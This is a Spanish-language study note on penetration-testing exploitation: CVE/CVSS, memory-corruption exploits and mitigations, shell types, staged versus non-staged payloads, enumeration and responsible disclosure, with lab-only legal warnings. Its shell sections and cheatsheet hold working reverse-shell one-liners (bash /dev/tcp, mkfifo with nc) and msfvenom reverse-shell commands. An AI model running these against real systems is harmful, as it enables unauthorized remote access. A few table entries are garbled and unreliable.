---
aliases:
  - Explotación de Vulnerabilidades
  - Shells en Ciberseguridad
  - Payloads Staged y Non-Staged
  - Burp Suite
  - Enumeración de Sistemas Linux
tags:
  - sec/exploit
  - herramientas/burpsuite
  - linux/seguridad
  - redes/conceptos
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Reconocimiento y Escaneo de Redes y Web]]"
  - "[[Enumeración de Servicios y CMS]]"
  - "[[Python Ofensivo]]"
  - "[[Msfvenom - Herramienta de Generación de Payloads]]"
  - "[[Elevación de Privilegios mediante Explotación de Binarios]]"
fuente: "https://nvd.nist.gov/vuln-metrics/cvss"
---

# Introducción a la Explotación de Vulnerabilidades

Tras el reconocimiento (ver [[Reconocimiento y Escaneo de Redes y Web]]) llega la fase de **explotación**: convertir una vulnerabilidad identificada en un resultado tangible (una shell, un archivo leído, una ejecución de código). Esta nota fija el marco —ciclo de vida, anatomía de un exploit, lenguaje CVE/CVSS, tipos de shells y payloads— sobre el que se apoyan todas las técnicas posteriores.

> [!warning] Seguridad y legalidad primero
> Toda explotación **sin autorización escrita es ilegal** (CNI/LOIH en España, CFAA en EE. UU.). Reglas de oro del laboratorio:
> - Aislamiento: VMs de víctima y atacante en red **host-only/interna**, sin salida a Internet si es posible.
> - Alcance (*scope*) explícito y límites acordados (especialmente en bug bounties: ver §8).
> - Sin DoS, sin borrado de datos, sin modificar servicios más allá de lo necesario para la prueba.
> - Cada acción queda registrada con timestamp para el informe (ver [[Creación de Informes en LaTeX]]).
>
> Los comandos de esta nota son **documentación de referencia**: se leen, se entienden y se practican en laboratorios propios (HTB, VulnHub, DVWA), nunca contra sistemas ajenos.

## 1. Ciclo de vida de una vulnerabilidad

```
Descubrimiento → Confirmación (PoC) → Explotación → Payload → Post-explotación → Reporte
     │                 │                    │            │              │
  hallazgo         reproduce el        convierte el    lo que se       escalada,
  (fuzzing,        bug sin daño        fallo en        envía/executa    lateral,
  código, CVE)     (crash mínimo)      control         (shell, data)    informe
```

| Etapa | Qué se hace | Resultado | Ejemplo |
|---|---|---|---|
| **Descubrimiento** | Fuzzing, revisión de código, OSINT de CVEs, escaneo de versiones | Sospecha fundamentada | `nmap -sV` → Apache 2.4.49 |
| **PoC** (*proof of concept*) | Reproducir el fallo con mínima magnitud | Confirma que es real, no te da control | Petición que provoca 500 / crash |
| **Explotación** | Convertir el fallo en ejecución o fuga de datos | Acceso: shell, fichero, bypass | Payload que salta a `system()` |
| **Payload** | Código que se ejecuta en el objetivo | Reverse shell, meterpreter, stager | `bash -i >& /dev/tcp/…` |
| **Post-explotación** | Consolidar: enumerar, escalar, moverte lateralmente | Objetivo cumplido | LSE, sudo, SUID (ver escalada) |
| **Reporte** | Evidencia, impacto, remediación | Hallazgo cerrado | [[Creación de Informes en LaTeX]] |

### Descubrimiento: de dónde salen los exploits

| Fuente | Mecánica | Dónde |
|---|---|---|
| **CVE** | Identificador público de vulnerabilidad conocida | <https://cve.mitre.org/> · NVD |
| **Exploit-DB / searchsploit** | Exploits públicos listos (coincidencia de versión) | `searchsploit apache 2.4.49` |
| **Fuzzing** | Entradas malformadas buscando crashes | AFL, wfuzz, BOF |
| **Revisión de código** | Taint analysis: entrada → sink sin sanitizar | Semgrep, code review |
| **CVAs/CWEs** | Clasificación del *tipo* de bug (CWE-79 = XSS) | <https://cwe.mitre.org/> |

## 2. CVE y CVSS: el lenguaje del triaje

- **CVE** = identificador único y público (`CVE-2014-0160`). Sirve para *comunicar* sin describir el exploit.
- **CWE** = clase de debilidad (`CWE-119` buffer errors) — agrupa muchos CVEs.
- **CVSS** = puntuación 0,0–10,0 que prioriza; el vector explica la nota:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   → 9,8 (crítico)
```

| Componente | Valores | Pregunta |
|---|---|---|
| **AV** (Attack Vector) | `N` red, `L` local, `A` adyacente, `F` físico | ¿Desde dónde se puede explotar? |
| **AC** (Complexity) | `L` baja, `Al` alta | ¿Requiere condiciones especiales? |
| **PR** (Privileges) | `N` ninguna, `L` bajas, `H` altas | ¿Qué acceso previo hace falta? |
| **UI** (User Interaction) | `N` ninguna, `S` requerida | ¿Necesita que alguien haga click? |
| **S** (Scope) | `U` sin cambio, `C` con cambio | ¿Afecta a otro componente? |
| **C/I/A** | `H/M/L` | Confidencialidad / Integridad / Disponibilidad |

| Rango CVSS | Severidad | Acción típica |
|---|---|---|
| 0,0–3,9 | Baja | Backlog |
| 4,0–6,9 | Media | Parche en ciclo normal |
| 7,0–8,9 | Alta | Parche prioritario |
| 9,0–10,0 | **Crítico** | Parche inmediato / explotación trivial |

> [!tip] CVSS ≠ riesgo real
> Un CVSS 9,8 con el puerto solo accesible desde una VLAN interna no es "urgente" para el negocio; un 7,5 expuesto a Internet sí lo es. Usa CVSS como base y **añade contexto**: exposición, valor del activo, existencia de exploit público (KEV de CISA).

## 3. Anatomía de un exploit (memoria corrupta)

La mayoría de exploits binarios nacen de errores de memoria; entenderlos explica qué hace "dentro" un exploit automatizado:

| Tipo de bug | Mecánica | Resultado para el atacante |
|---|---|---|
| **Buffer overflow (stack)** | Escritura más allá de un buffer local → se pisa el puntero de retorno | Control de EIP/RIP → ejecución arbitraria |
| **Format string** (`printf(user)`) | `%n` escribe en direcciones de la pila | Lectura/escritura arbitraria |
| **Integer overflow** | `len + cabecera` desborda y alloca poco → heap overflow | Corrupción de estructuras adyacentes |
| **Use-after-free** | Objeto liberado y reutilizado | Tipo confusion → vtable hijack |
| **Deserialización** | Datos no confiables reconstruyen objetos con métodos peligrosos | RCE (ver [[Abuso de APIs]] y notas de deserialización) |

### Del crash al shell: las capas de un exploit

1. **Localizar el offset**: cyclic pattern → saber en qué byte cae el RIP (`pattern_create`/`pattern_offset` de Metasploit, `pwn cyclic`).
2. **Controlar el flujo**: sobreescribir el retorno con la dirección de una `gadget` o de `shellcode`.
3. **Bypass de defensas**: cada mitigación obliga a una técnica:

| Mitigación | Qué impone | Técnica ofensiva típica |
|---|---|---|
| **NX/DEP** (no ejecución en stack) | El stack no es ejecutable | **ROP**: encadenar gadgets existentes (`ret2libc`, `system("/bin/sh")`) |
| **ASLR** (aleatorización de direcciones) | Direcciones desconocidas | Leak de puntero (format string, error HTTP) o fuzz de 4 bits en 32 bits |
| **PIE** (binario relocable) | El propio binario se desplaza | Leak del base address + desplazamientos relativos |
| **Stack canary** | Checksum entre buffer y retorno | Leer la canary (leak) antes de desbordar |
| **RELRO completo** | GOT en solo-lectura | No se puede reescribir la GOT → buscar otra vía |

> [!info] Shellcode, stager y ROP en una frase cada uno
> - **Shellcode**: código máquina en bruto (p. ej. `execve("/bin/sh")`) que se inyecta y se redirige el flujo hacia él.
> - **Stager**: trozo mínimo que abre un canal y descarga el payload grande (§5).
> - **ROP**: sin poder ejecutar código propio, encadenas fragmentos ya presentes en el binario (`gadget`s terminados en `ret`) hasta montar el efecto deseado.
>
> En CTF, estos pasos los automatiza Metasploit o `pwntools`; entenderlos permite adaptar el exploit cuando el binario varía (ver [[Elevación de Privilegios mediante Explotación de Binarios]]).

## 4. Shells: reverse, bind y forward

| Tipo | Quién conecta a quién | Requiere | Uso típico |
|---|---|---|---|
| **Reverse shell** | Víctima → atacante (escucha) | Puerto de salida abierto en la víctima | El 90% de los casos; evita firewalls de entrada |
| **Bind shell** | Atacante → víctima (puerto abierto) | Puerto accesible *hacia* la víctima | Solo sin firewall/DMZ abierta |
| **Forward shell** | Canal intermedio existente (HTTP/webshell) + FIFO local | Acceso previo por otro canal | Firewalls estrictos, sin conexión directa |

- **Reverse shell**: la víctima inicia la conexión; se aprovechan las reglas de salida, normalmente más permisivas. Ejemplo clásico: `bash -i >& /dev/tcp/ATT/PRT 0>&1` (catálogo completo en [[Python Ofensivo]]).
- **Bind shell**: la víctima escucha en un puerto; el atacante se conecta. **Warning**: exige que el firewall permita entradas, por eso cae en desuso frente a reverse.
- **Forward shell con `mkfifo`**: se crea un *named pipe* en la víctima; un proceso escribe y otro lee, simulando una consola bidireccional sobre un canal ya existente (p. ej. HTTP tunneling) sin abrir nuevos puertos.

```bash
# Mecanismo de la forward shell (patrón mkfifo en la víctima)
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATT 80 > /tmp/f; rm /tmp/f
```

> [!info] Por qué un FIFO
> `mkfifo` crea un archivo especial con política FIFO en el filesystem: sobrevive a los procesos y admite apertura concurrente. El shell escribe su stdout en la tubería y el lector remoto devuelve comandos por la misma vía — comunicación bidireccional sin conexión TCP propia.

## 5. Payloads: staged vs non-staged

| | **Staged** | **Non-staged** |
|---|---|---|
| Qué se envía | 1ª etapa mínima (**stager**) que descarga el resto | Payload completo de una vez |
| Tamaño inicial | Kilobytes | Cientos de KB |
| Ventaja | Evasión (poco que inspeccionar al principio) y adaptación del 2º estadio | Simple, sin segundo canal |
| Riesgo | El stager también se detecta; el download puede ser bloqueado | Más fácil de capturar por IDS/AV por tamaño y firmas |
| Ejemplo msfvenom | `payload/windows/shell_reverse_tcp` | `payload/windows/shell_reverse_tcp` **sin** `-stageless`… en Meterpreter: `.../meterpreter/reverse_tcp` vs `.../meterpreter_reverse_tcp` |

```bash
# Generación de payloads — referencia completa en [[Msfvenom - Herramienta de Generación de Payloads]]
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o rev.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev.exe
```

> [!warning] Detección
> Los payloads non-staged envían todo el código de una vez: IDS/AV basados en firmas y tamaño los capturan más fácil. Los staged son más pequeños pero añaden tráfico de descarga que también se correlaciona. La respuesta defensora en ambos casos: detección de comportamiento (spawn de shell desde proceso de red), no solo firmas.

## 6. Explotación manual vs automatizada

| | **Manual** | **Automatizada** |
|---|---|---|
| Cómo | Ajuste fino con la consola: payloads, offsets, offsets de versión | Metasploit, Nessus, scripts |
| Velocidad | Lenta | Rápida, escalable a muchos hosts |
| Precisión | Alta; control total del alcance | Más falsos positivos, ajuste limitado |
| "Ruido" en red | Bajo | Alto (muchas peticiones, firmas conocidas) |
| Ideal para | Vulnerabilidades complejas, entornos frágiles, acceso sigiloso | Barridos amplios, vulnerabilidades conocidas con exploit público |

> [!tip] Flujo recomendado
> Automatiza el **descubrimiento** (`searchsploit`, escaneo), manualiza la **explotación** cuando el automatizado falla o hace demasiado ruido. Metasploit como andamio, no como caja negra: si no entiendes qué hace el módulo, no sabrás qué escribir en el informe ni por qué falla.

## 7. Post-explotación inicial: enumeración

Algunas herramientas clave para consolidar el acceso (detalle en escalada de privilegios):

| Herramienta | Qué aporta | Enlace |
|---|---|---|
| **LSE** (*Linux Smart Enumeration*) | Jerarquiza hallazgos: SUID, cron, permisos, red, contenedores | <https://github.com/diego-treitos/linux-smart-enumeration> |
| **Pspy** | Vigila procesos en tiempo real **sin root** (inclusos los efímeros de cron) | <https://github.com/DominicBreuker/pspy> |
| **`ps -eo user,command`** | Lista todos los procesos con su usuario y línea de comandos — base de cualquier vigilancia manual | — |

```bash
# Vigilancia de actividad periódica con ps (bucle sencillo)
while true; do ps -eo user,command --sort=start_time | tail -20; sleep 2; done
# Con Pspy (binario estático en la víctima):
./pspy64     # muestra UIDs, PIDs y comandos de cron/systemd en vivo
```

> [!info] Por qué Pspy
> Las tareas cron cortas aparecen y desaparecen entre dos `ps` consecutivos; Pspy lee `/proc` y los eventos `inotify`/`fanotify` continuamente, así que captura también los procesos que duran milisegundos — el clásico vector de escalada por cron mal configurado.

## 8. Divulgación responsable y alcance

| Paso | Contenido |
|---|---|
| 1. Verificar | PoC reproducible, sin DoS, en tus laboratorios o con autorización |
| 2. Notificar | Canal privado del proveedor (SECURITY.md, bug bounty, CERT/CSIRT) |
| 3. Plazo | Coordinación típica: 90 días públicos, 30–60 privados según política |
| 4. Resolución | El vendor parchea, se asigna CVE, se publica advisory |
| 5. Publicación | Solo con permiso; sin exploit detallado antes del parche |

En bug bounties (HackerOne, Bugcrowd): el **scope** define qué activos, dominios y tipos de vulnerabilidad son elegibles; salirse del scope anula la recompensa y puede acarrear consecuencias legales. Ignorar `robots.txt` o probar en producción sin autorización expresa = fuera de programa.

## 9. Errores comunes del operador

1. **Explotar sin enumerar**: el payload adecuado depende de arquitectura (`x86` vs `x64`), SO y versión — `file`, `uname -a`, `nmap -sV` antes.
2. **Elegir non-staged cuando no cabe** (o staged cuando no hay salida a Internet): el stager necesita conectarse de vuelta.
3. **Confiar en el exploit de searchsploit sin leerlo**: muchas versiones difieren en offsets; adaptar siempre.
4. **Olvidar el listener**: `nc -lvnp 443` tiene que estar antes de disparar el payload.
5. **No verificar estabilidad**: un exploit que crash-ea la mitad de las veces arruina la prueba y alerta al defensor.
6. **Mezclar laboratorio y producción** sin alcance escrito — el error más caro de todos.

## 10. Cheatsheet

```bash
# Identificar
nmap -p- --open -sS -sV -sC <IP> -oN all          # versión + scripts
searchsploit <producto> <versión>                  # exploits públicos
curl -s <URL> | head -30                           # servidor/tecnología

# Preparar
msfvenom -p <payload> LHOST=<tu_ip> LPORT=<puerto> -f <formato> -o out
nc -lvnp <puerto>                                  # listener ANTES de disparar

# Shells de emergencia (laboratorio autorizado)
bash -i >& /dev/tcp/IP/PORT 0>&1                   # reverse bash
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc IP 80 > /tmp/f   # forward

# Post-explotación
./lse.sh -l 1 ; ./pspy64 ; sudo -l ; find / -perm -4000 2>/dev/null
```

## 11. Referencias

- NVD / CVSS: <https://nvd.nist.gov/vuln-metrics/cvss>
- CVE: <https://cve.mitre.org/> · CWE: <https://cwe.mitre.org/>
- Exploit Database: <https://www.exploit-db.com/> · GTFOBins: <https://gtfobins.github.io/>
- HackTricks (post-explotación): <https://book.hacktricks.wiki/>
- MITRE ATT&CK (técnicas): <https://attack.mitre.org/>
- CISA KEV (exploits en explotación activa): <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>

## Relacionadas

- [[Reconocimiento y Escaneo de Redes y Web]] — la fase previa
- [[Enumeración de Servicios y CMS]] — de versión a vulnerability mapping
- [[Python Ofensivo]] — catálogo de reverse shells y herramientas propias
- [[Msfvenom - Herramienta de Generación de Payloads]] — generar payloads
- [[Elevación de Privilegios mediante Explotación de Binarios]] — del crash al root
- [[Creación de Informes en LaTeX]] — documentar el hallazgo
